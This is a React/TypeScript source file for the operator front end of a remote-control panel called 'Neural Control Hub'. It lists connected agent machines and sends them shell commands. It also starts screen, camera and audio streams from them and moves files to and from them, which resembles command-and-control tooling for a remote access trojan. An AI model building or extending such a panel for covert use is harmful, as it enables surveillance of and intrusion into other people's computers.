import React, { createContext, useContext, useEffect, useState, useCallback } from 'react';
import { io, Socket } from 'socket.io-client';
import apiClient from '../services/api';

interface Agent {
  id: string;
  name: string;
  status: 'online' | 'offline';
  platform: string;
  ip: string;
  lastSeen: Date;
  capabilities: string[];
  performance: {
    cpu: number;
    memory: number;
    network: number;
  };
}

interface SocketContextType {
  socket: Socket | null;
  connected: boolean;
  authenticated: boolean;
  agents: Agent[];
  selectedAgent: string | null;
  setSelectedAgent: (agentId: string | null) => void;
  sendCommand: (agentId: string, command: string) => void;
  startStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
  stopStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
  uploadFile: (agentId: string, file: File, destinationPath: string) => void;
  downloadFile: (agentId: string, filename: string) => void;
  commandOutput: string[];
  addCommandOutput: (output: string) => void;
  clearCommandOutput: () => void;
  login: (password: string) => Promise<boolean>;
  logout: () => Promise<void>;
  agentMetrics: Record<string, { cpu: number; memory: number; network: number }>;
}

const SocketContext = createContext<SocketContextType | null>(null);

export function SocketProvider({ children }: { children: React.ReactNode }) {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [connected, setConnected] = useState(false);
  const [authenticated, setAuthenticated] = useState(false);
  const [agents, setAgents] = useState<Agent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [commandOutput, setCommandOutput] = useState<string[]>([]);
  const [agentMetrics, setAgentMetrics] = useState<Record<string, { cpu: number; memory: number; network: number }>>({});

  const addCommandOutput = useCallback((output: string) => {
    console.log('🔍 SocketProvider: addCommandOutput called with:', output);
    setCommandOutput(prev => {
      const newOutput = [...prev.slice(-99), output]; // Keep last 100 lines
      console.log('🔍 SocketProvider: Updated commandOutput array length:', newOutput.length);
      return newOutput;
    });
  }, []);

  const clearCommandOutput = useCallback(() => {
    setCommandOutput([]);
  }, []);

  useEffect(() => {
    // Connect to Socket.IO server
    // If running in production (same origin as backend), use current origin
    // Otherwise use environment variable or localhost for development
    let socketUrl: string;
    
    if (window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
      // Production: use same origin as the current page
      socketUrl = `${window.location.protocol}//${window.location.host}`;
    } else {
      // Development: use environment variable or default to localhost
      socketUrl = (import.meta as any)?.env?.VITE_SOCKET_URL || (window as any)?.__SOCKET_URL__ || 'http://localhost:8080';
    }
    
    console.log('Connecting to Socket.IO server:', socketUrl);
    
    let socketInstance: Socket;
    
    try {
      socketInstance = io(socketUrl, {
        transports: ['websocket', 'polling'],
        timeout: 20000,
        reconnection: true,
        reconnectionAttempts: 5,
        reconnectionDelay: 1000,
      });

      setSocket(socketInstance);
    } catch (error) {
      console.error('Failed to initialize socket connection:', error);
      addCommandOutput(`Connection Error: Failed to initialize socket connection to ${socketUrl}`);
      return;
    }

    // Add debug event listener to see all events
    socketInstance.onAny((eventName, ...args) => {
      console.log(`🔍 SocketProvider: Received event '${eventName}':`, args);
      if (eventName === 'command_result') {
        console.log('🔍 SocketProvider: COMMAND_RESULT EVENT RECEIVED!', args);
        console.log('🔍 SocketProvider: Event data type:', typeof args[0]);
        console.log('🔍 SocketProvider: Event data keys:', Object.keys(args[0] || {}));
      }
    });

    // Connection events
    socketInstance.on('connect', () => {
      setConnected(true);
      console.log('🔍 SocketProvider: Connected to Neural Control Hub');
      
      // Join operators room and request agent list
      socketInstance.emit('operator_connect');
      console.log('🔍 SocketProvider: operator_connect event emitted');
      
      // Request agent list after a short delay to ensure room joining is complete
      setTimeout(() => {
        console.log('🔍 SocketProvider: Requesting agent list');
        socketInstance.emit('request_agent_list');
      }, 500);
    });

    socketInstance.on('disconnect', (reason) => {
      setConnected(false);
      console.log('Disconnected from Neural Control Hub:', reason);
      addCommandOutput(`Disconnected: ${reason}`);
    });

    socketInstance.on('connect_error', (error) => {
      console.error('Connection error:', error);
      addCommandOutput(`Connection Error: ${error.message || 'Unknown error'}`);
    });

    socketInstance.on('reconnect', (attemptNumber) => {
      console.log('Reconnected after', attemptNumber, 'attempts');
      addCommandOutput(`Reconnected after ${attemptNumber} attempts`);
    });

    socketInstance.on('reconnect_error', (error) => {
      console.error('Reconnection error:', error);
      addCommandOutput(`Reconnection Error: ${error.message || 'Unknown error'}`);
    });

    // Agent management events
    socketInstance.on('agent_list_update', (agentData: Record<string, any>) => {
      try {
        console.log('🔍 SocketProvider: Received agent_list_update:', agentData);
        console.log('🔍 SocketProvider: Agent data keys:', Object.keys(agentData));
        console.log('🔍 SocketProvider: This confirms we are in the operators room!');
        const agentList = Object.entries(agentData).map(([id, data]: [string, any]) => {
          console.log(`Processing agent ${id}:`, data);
          // Safely parse last_seen date
          let lastSeenDate = new Date();
          let isOnline = false;
          
          if (data.last_seen) {
            try {
              lastSeenDate = new Date(data.last_seen);
              const timeDiff = new Date().getTime() - lastSeenDate.getTime();
              isOnline = timeDiff < 60000; // 60 seconds threshold
            } catch (dateError) {
              console.warn(`Invalid date format for agent ${id}: ${data.last_seen}`);
            }
          }
          
          return {
            id,
            name: data.name || `Agent-${id.slice(0, 8)}`,
            status: isOnline ? 'online' : 'offline',
            platform: data.platform || 'Unknown',
            ip: data.ip || '127.0.0.1',
            lastSeen: lastSeenDate,
            capabilities: Array.isArray(data.capabilities) ? data.capabilities : ['screen', 'commands'],
            performance: {
              cpu: data.cpu_usage || data.performance?.cpu || 0,
              memory: data.memory_usage || data.performance?.memory || 0,
              network: data.network_usage || data.performance?.network || 0
            }
          };
        });
        console.log('Processed agent list:', agentList);
        setAgents(agentList);
      } catch (error) {
        console.error('Error processing agent list update:', error);
      }
    });

    // Room joining confirmation
    socketInstance.on('joined_room', (room: string) => {
      console.log('🔍 SocketProvider: Successfully joined room:', room);
      if (room === 'operators') {
        console.log('🔍 SocketProvider: SUCCESS! Now in operators room - should receive command results');
      }
    });

    // Command result events
    socketInstance.on('command_result', (data: any) => {
      console.log('🔍 SocketProvider: Command result received:', data);
      console.log('🔍 SocketProvider: Command result handler called!');
      console.log('🔍 SocketProvider: Data type:', typeof data);
      console.log('🔍 SocketProvider: Data keys:', Object.keys(data || {}));
      
      if (!data || typeof data !== 'object') {
        console.error('🔍 SocketProvider: Invalid command result data:', data);
        return;
      }
      
      // Check for PowerShell formatted output (client.py v2.1 format)
      let resultText = '';
      
      if (data.formatted_text) {
        // Use the pre-formatted PowerShell output with proper line breaks and spacing
        resultText = data.formatted_text;
        console.log('🔍 SocketProvider: Using formatted_text (PowerShell format)');
      } else if (data.output) {
        // Fallback to plain output for backward compatibility
        resultText = data.output;
        console.log('🔍 SocketProvider: Using plain output (legacy format)');
      } else {
        console.warn('🔍 SocketProvider: No output or formatted_text in command result');
        return;
      }
      
      console.log('🔍 SocketProvider: Adding command output, length:', resultText.length);
      console.log('🔍 SocketProvider: Current commandOutput length:', commandOutput.length);
      
      // Add command output immediately (preserve all formatting)
      addCommandOutput(resultText);
      console.log('🔍 SocketProvider: Command output added successfully');
    });

    // Legacy command output events (for backward compatibility)
    socketInstance.on('command_output', (data: { agent_id: string; output: string }) => {
      addCommandOutput(`[${data.agent_id}] ${data.output}`);
    });

    // Lightweight telemetry updates from agents
    socketInstance.on('agent_telemetry', (data: { agent_id: string; cpu?: number; memory?: number; network?: number }) => {
      const { agent_id, cpu = 0, memory = 0, network = 0 } = data || ({} as any);
      if (agent_id) {
        setAgentMetrics(prev => ({
          ...prev,
          [agent_id]: { cpu, memory, network }
        }));
        // Also update performance snapshot in agents list if present
        setAgents(prev => prev.map(a => a.id === agent_id ? ({
          ...a,
          performance: {
            cpu: cpu ?? a.performance.cpu,
            memory: memory ?? a.performance.memory,
            network: network ?? a.performance.network,
          }
        }) : a));
      }
    });

    // Streaming events
    socketInstance.on('screen_frame', (data: { agent_id: string; frame: string }) => {
      console.log('📹 SocketProvider: Received screen_frame from agent:', data.agent_id);
      // Handle screen frame updates
      const event = new CustomEvent('screen_frame', { detail: data });
      window.dispatchEvent(event);
    });

    socketInstance.on('camera_frame', (data: { agent_id: string; frame: string }) => {
      console.log('📷 SocketProvider: Received camera_frame from agent:', data.agent_id);
      // Handle camera frame updates
      const event = new CustomEvent('camera_frame', { detail: data });
      window.dispatchEvent(event);
    });

    socketInstance.on('audio_frame', (data: { agent_id: string; frame: string }) => {
      console.log('🎤 SocketProvider: Received audio_frame from agent:', data.agent_id);
      // Handle audio frame updates
      const event = new CustomEvent('audio_frame', { detail: data });
      window.dispatchEvent(event);
    });

    // File transfer events - Download chunks
    const downloadBuffers: Record<string, { chunks: Uint8Array[], totalSize: number }> = {};
    
    socketInstance.on('file_download_chunk', (data: any) => {
      console.log('📥 Received file_download_chunk:', data);
      
      if (data.error) {
        console.error(`Download error: ${data.error}`);
        addCommandOutput(`Download failed: ${data.error}`);
        delete downloadBuffers[data.filename];
        return;
      }
      
      // Initialize buffer for this file
      if (!downloadBuffers[data.filename]) {
        downloadBuffers[data.filename] = { chunks: [], totalSize: data.total_size };
        console.log(`📥 Starting download: ${data.filename} (${data.total_size} bytes)`);
        addCommandOutput(`📥 Downloading: ${data.filename} (${data.total_size} bytes)`);
      }
      
      // Decode base64 chunk
      const base64Data = data.chunk.split(',')[1]; // Remove "data:..." prefix
      const binaryString = atob(base64Data);
      const bytes = new Uint8Array(binaryString.length);
      for (let i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }
      downloadBuffers[data.filename].chunks.push(bytes);
      
      // Calculate progress
      const receivedSize = downloadBuffers[data.filename].chunks.reduce((sum, chunk) => sum + chunk.length, 0);
      const progress = Math.round((receivedSize / data.total_size) * 100);
      console.log(`📊 Download progress: ${data.filename} - ${progress}%`);
      
      // Check if download is complete
      if (receivedSize >= data.total_size) {
        console.log(`✅ Download complete: ${data.filename}`);
        
        // Combine all chunks into one Uint8Array
        const totalLength = downloadBuffers[data.filename].chunks.reduce((sum, chunk) => sum + chunk.length, 0);
        const combinedArray = new Uint8Array(totalLength);
        let offset = 0;
        for (const chunk of downloadBuffers[data.filename].chunks) {
          combinedArray.set(chunk, offset);
          offset += chunk.length;
        }
        
        // Create Blob and trigger download
        const blob = new Blob([combinedArray]);
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = data.filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        // Clean up
        delete downloadBuffers[data.filename];
        addCommandOutput(`✅ Downloaded: ${data.filename} (${totalLength} bytes)`);
      }
      
      // Also dispatch custom event for FileManager component
      const event = new CustomEvent('file_download_chunk', { detail: data });
      window.dispatchEvent(event);
    });
    
    // Upload progress events
    socketInstance.on('file_upload_progress', (data: any) => {
      console.log(`📊 Upload progress: ${data.filename} - ${data.progress}%`);
      const event = new CustomEvent('file_upload_progress', { detail: data });
      window.dispatchEvent(event);
    });
    
    socketInstance.on('file_upload_complete', (data: any) => {
      console.log(`✅ Upload complete: ${data.filename} (${data.size} bytes)`);
      addCommandOutput(`✅ Uploaded: ${data.filename} (${data.size} bytes)`);
      const event = new CustomEvent('file_upload_complete', { detail: data });
      window.dispatchEvent(event);
    });
    
    // Download progress events
    socketInstance.on('file_download_progress', (data: any) => {
      console.log(`📊 Download progress: ${data.filename} - ${data.progress}%`);
      const event = new CustomEvent('file_download_progress', { detail: data });
      window.dispatchEvent(event);
    });
    
    socketInstance.on('file_download_complete', (data: any) => {
      console.log(`✅ Download complete: ${data.filename} (${data.size} bytes)`);
      const event = new CustomEvent('file_download_complete', { detail: data });
      window.dispatchEvent(event);
    });

    // WebRTC events
    socketInstance.on('webrtc_stats', (data: any) => {
      console.log('WebRTC Stats:', data);
    });

    socketInstance.on('webrtc_error', (data: { message: string }) => {
      console.error('WebRTC Error:', data.message);
      addCommandOutput(`WebRTC Error: ${data.message}`);
    });

    // Notification events - Forward to window for NotificationCenter
    socketInstance.on('notification', (notification: any) => {
      console.log('🔔 SocketProvider: Received notification event:', notification);
      // Dispatch custom event so NotificationCenter can pick it up
      const event = new CustomEvent('socket_notification', { detail: notification });
      window.dispatchEvent(event);
    });

    return () => {
      socketInstance.disconnect();
    };
  }, [addCommandOutput]);

  // Check authentication status on mount
  useEffect(() => {
    const checkAuthStatus = async () => {
      try {
        const response = await apiClient.checkAuthStatus();
        if (response.success && response.data?.authenticated) {
          setAuthenticated(true);
        } else {
          setAuthenticated(false);
        }
      } catch (error) {
        console.error('Failed to check auth status:', error);
        setAuthenticated(false);
      }
    };

    checkAuthStatus();
  }, []);

  const sendCommand = useCallback((agentId: string, command: string) => {
    console.log('🔍 SocketProvider: sendCommand called:', { agentId, command, socket: !!socket, connected });
    
    if (!socket || !connected) {
      console.error('🔍 SocketProvider: Not connected to server');
      addCommandOutput(`Error: Not connected to server`);
      return;
    }
    
    if (!agentId || !command.trim()) {
      console.error('🔍 SocketProvider: Invalid agent ID or command');
      addCommandOutput(`Error: Invalid agent ID or command`);
      return;
    }
    
    try {
      const commandData = { agent_id: agentId, command };
      console.log('🔍 SocketProvider: Emitting execute_command:', commandData);
      socket.emit('execute_command', commandData);
      console.log('🔍 SocketProvider: Command sent successfully');
      // Don't add command to output here - CommandPanel handles it
    } catch (error) {
      console.error('🔍 SocketProvider: Error sending command:', error);
      addCommandOutput(`Error: Failed to send command`);
    }
  }, [socket, connected, addCommandOutput]);

  const startStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
    if (socket && connected) {
      let command = '';
      switch (type) {
        case 'screen':
          command = 'start-stream';
          break;
        case 'camera':
          command = 'start-camera';
          break;
        case 'audio':
          command = 'start-audio';
          break;
      }
      socket.emit('execute_command', { agent_id: agentId, command });
      addCommandOutput(`Starting ${type} stream for ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const stopStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
    if (socket && connected) {
      let command = '';
      switch (type) {
        case 'screen':
          command = 'stop-stream';
          break;
        case 'camera':
          command = 'stop-camera';
          break;
        case 'audio':
          command = 'stop-audio';
          break;
      }
      socket.emit('execute_command', { agent_id: agentId, command });
      addCommandOutput(`Stopping ${type} stream for ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const uploadFile = useCallback((agentId: string, file: File, destinationPath: string) => {
    if (socket && connected) {
      const reader = new FileReader();
      reader.onload = () => {
        const base64Data = reader.result as string;
        // Split file into chunks for large files
        const chunkSize = 1024 * 512; // 512KB chunks
        const chunks = Math.ceil(base64Data.length / chunkSize);
        
        console.log(`📤 Uploading ${file.name} (${file.size} bytes) in ${chunks} chunks`);
        
        for (let i = 0; i < chunks; i++) {
          const start = i * chunkSize;
          const end = start + chunkSize;
          const chunk = base64Data.slice(start, end);
          
          // ✅ Use event name that deployed controller expects
          socket.emit('upload_file_chunk', {
            agent_id: agentId,
            filename: file.name,
            data: chunk,  // Controller expects 'data' field
            offset: start,
            total_size: file.size,  // ✅ FIXED: Send actual file size!
            destination_path: destinationPath
          });
        }
        
        // ✅ Use event name that deployed controller expects
        socket.emit('upload_file_end', {
          agent_id: agentId,
          filename: file.name,
          destination_path: destinationPath
        });
        
        addCommandOutput(`Uploading ${file.name} (${file.size} bytes) to ${agentId}:${destinationPath}`);
      };
      reader.readAsDataURL(file);
    }
  }, [socket, connected, addCommandOutput]);

  const downloadFile = useCallback((agentId: string, filename: string) => {
    if (socket && connected) {
      socket.emit('download_file', {
        agent_id: agentId,
        filename: filename
      });
      addCommandOutput(`Downloading ${filename} from ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const login = useCallback(async (password: string): Promise<boolean> => {
    try {
      const response = await apiClient.login(password);
      if (response.success) {
        setAuthenticated(true);
        return true;
      }
      return false;
    } catch (error) {
      console.error('Login failed:', error);
      return false;
    }
  }, []);

  const logout = useCallback(async (): Promise<void> => {
    try {
      await apiClient.logout();
    } catch (error) {
      console.error('Backend logout failed (continuing):', error);
    }
    try {
      if (socket) {
        socket.disconnect();
      }
    } catch (e) {
      console.warn('Socket disconnect error:', e);
    }
    setAgents([]);
    setSelectedAgent(null);
    setConnected(false);
    setAuthenticated(false);
    clearCommandOutput();
    try {
      // Redirect to login page (server-rendered)
      window.location.href = '/login';
    } catch {}
  }, [socket, clearCommandOutput]);

  const value: SocketContextType = {
    socket,
    connected,
    authenticated,
    agents,
    selectedAgent,
    setSelectedAgent,
    sendCommand,
    startStream,
    stopStream,
    uploadFile,
    downloadFile,
    commandOutput,
    addCommandOutput,
    clearCommandOutput,
    login,
    logout,
    agentMetrics,
  };

  return (
    <SocketContext.Provider value={value}>
      {children}
    </SocketContext.Provider>
  );
}

export function useSocket() {
  const context = useContext(SocketContext);
  if (!context) {
    throw new Error('useSocket must be used within a SocketProvider');
  }
  return context;
}